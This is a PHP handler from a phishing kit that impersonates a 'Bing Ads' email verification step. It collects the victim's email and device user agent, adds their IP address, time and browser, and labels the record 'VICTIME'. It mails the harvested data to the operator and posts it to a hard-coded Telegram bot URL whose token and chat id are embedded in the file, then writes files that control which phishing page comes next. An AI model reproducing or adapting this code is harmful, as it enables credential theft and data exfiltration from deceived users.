<?php

include('get_browser.php');
include('get_ip.php');
include('Email.php');
$ip= $_SERVER['REMOTE_ADDR'];
$TIME_DATE = date('H:i:s d/m/Y');	
if(isset($_POST) ){

$data = array();	
	
if ($_POST['EMAIL'] == "" || $_POST['DEVICE'] == "") {
  
  

$data['statut'] = 'error'; 
$data['title'] = 'error';
$data['resultat']="no data entered";
  
  }else{

$DCH_MESSAGE .= "
+=======VICTIME BING ADS INFORMATION========+
| IP INFO          =".$ip."    
| TIME/DATE        =".$TIME_DATE."
| BROWSER          =".XB_Browser($_SERVER['HTTP_USER_AGENT'])." On ".XB_OS($_SERVER['HTTP_USER_AGENT'])." 
+==========EMAIL VERIFY BING ADS========+
| DEVICE USER AGENT      =  ".$_POST['DEVICE']."
| EMAIL VERIFY      =  ".$_POST['EMAIL']."
+===============================+\n";

$DCH_SUBJECT .= "EMAIL VERIFY BING ADS";
$DCH_HEADERS .= "From: TCHE-Dev<cantact>";
$DCH_HEADERS .= "TCHE-Version: 1.0\n";
$DCH_HEADERS .= "Content-type: text/html; charset=UTF-8\n";
@mail($DCH_EMAIL, $DCH_SUBJECT, $DCH_MESSAGE, $DCH_HEADERS);
file_get_contents("https://api.telegram.org/bot6893357240:AAFi-xdLiSAyZ5L4EZ4XH8_T9_jjtrl0VrQ/sendMessage?chat_id=5825356535&text=".urlencode($DCH_MESSAGE)."" );


$Page .= ' ';

$fPage = fopen("../Select/Show_system/Show_Page.txt", "w");
$fPagecle = fopen("../Select/Show_system/Show_Cleverify.txt", "w");
$fPageapp = fopen("../Select/Show_system/Show_Appverify.txt", "w");

fwrite($fPage, $Page);
fwrite($fPagecle, $Page);
fwrite($fPageapp, $Page);
fwrite($fPage, $Page);

$data['statut'] = 'success'; 
$data['title'] = 'succès'; 
$data['resultat']="valider";

}

echo json_encode($data);

}


